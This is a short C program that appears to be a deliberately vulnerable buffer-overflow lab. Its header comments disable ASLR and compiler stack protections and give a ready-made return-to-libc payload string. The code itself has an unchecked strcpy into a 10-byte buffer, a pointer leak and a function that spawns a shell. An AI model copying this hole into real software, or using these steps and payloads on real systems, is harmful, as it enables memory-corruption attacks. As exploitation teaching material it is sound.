//echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
//sudo sysctl -w kernel.randomize_va_space=1
//ulimit -c unlimited
//gcc -fno-stack-protector -z execstack vuln.c -o vuln -m32 
//run `python -c 'print("A"*22 + "\x80\xcd\xe3\xf7" + "\xb0\x09\xe3\xf7" + "\x80\x85\x04\x08")'`

#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

const char *cmd = "/bin/ls";

void vuln(char* input){
    printf("cmd is at: %p\n", cmd);
    char buf[10];
    strcpy(buf, input);
    printf("buff is: %s\n", buf);
}

void systemcall(){
    system("/bin/sh");
}

int main(int argc, char* argv[]){
    vuln(argv[1]);
    return 0;
}